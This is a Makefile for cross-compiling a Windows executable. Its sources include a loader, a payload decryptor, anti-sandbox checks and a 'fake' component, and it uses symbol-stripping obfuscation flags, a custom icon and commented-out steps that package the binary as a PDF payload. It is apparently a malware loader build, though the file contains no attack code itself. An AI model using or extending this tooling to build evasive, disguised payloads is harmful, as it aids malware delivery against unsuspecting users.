SRC = build/loader.c build/definitions.c build/fake.c build/decrypt.c build/winapi.c build/anti_sandbox.c build/payload.c
HEADERS = build/definitions.h
OUTPUT_FILE=$(shell grep -oP '^output_file=\K.*' .conf)
PRIORIZE_SIZE = $(shell grep -oP '^priorize_size=\K.*' .conf)

ifeq ($(strip $(PRIORIZE_SIZE)),true)
	STDLIB = -nostdlib
	ICON = 
	ENTRYPOINT = WinMainCRTStartup
else
	STDLIB = 
	ICON = build/icon.o
	ENTRYPOINT = WinMain
endif

#------------------------------------------------------------------

CC = x86_64-w64-mingw32-gcc
CFLAGS = $(STDLIB) -Ibuild -Wall -Wextra -Os -O2 -mwindows -ffunction-sections -fdata-sections -fno-asynchronous-unwind-tables -fno-unwind-tables -fno-exceptions -fno-stack-protector -fno-stack-check -fno-strict-aliasing -ffreestanding
WARNINGS = -Wno-cast-function-type -Wno-unused-parameter -Wno-unused-variable -Wattributes
LIBS = -lmingw32 -lkernel32 -lntdll -luser32 -ladvapi32 -lshell32 -lwininet -lm -lgcc 
OBFUSCATION = -s -fvisibility=hidden -fno-inline -fno-builtin -fno-ident
LDFLAGS = -Wl,--gc-sections,--entry=$(ENTRYPOINT),--disable-auto-import,--no-insert-timestamp

.PHONY: all clean pre-build post-build

all: pre-build $(ICON) $(OUTPUT_FILE) post-build


pre-build:
	@mkdir -p bin build
	@cp src/* build/
	@cp asm/* build/
	@python3 main.py
	# @rm build/payload.txt

$(ICON): icon/icon.rc
	x86_64-w64-mingw32-windres icon/icon.rc -o $(ICON)

$(OUTPUT_FILE): $(SRC) $(HEADERS)
	$(CC) $(CFLAGS) $(WARNINGS) $(SRC) $(ICON) -static -static-libgcc -o bin/$@ $(LDFLAGS) $(LIBS) $(OBFUSCATION)

post-build:
	cp bin/$(OUTPUT_FILE) ../../sandbox/
	# cp bin/$(OUTPUT_FILE) pdf/payload.exe
	# @./pdf/create.sh

clean:
	rm -rf bin build